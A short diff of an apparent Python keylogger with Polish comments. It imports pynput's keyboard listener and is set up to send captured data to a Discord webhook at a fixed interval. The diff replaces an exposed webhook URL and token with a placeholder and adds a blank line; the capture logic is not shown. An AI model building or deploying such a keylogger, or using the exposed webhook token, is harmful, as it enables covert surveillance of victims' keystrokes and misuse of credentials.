@@ -10,7 +10,7 @@ from datetime import datetime
 from pynput import keyboard
 
 # Konfiguracja
-DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1457502534934466711/F2MTZv67X7IAFmNH3cR9ZJhvrsm2CJlrUjZbjVZQkK9Mj4CWnHa-ox3eFbRwOwK_Jgn9"
+DISCORD_WEBHOOK_URL = "your webhook"
 INTERVAL = 20
 IDLE_THRESHOLD = 4
 
@@ -116,4 +116,5 @@ def main():
     sys.exit()
 
 if __name__ == "__main__":
+
     main()
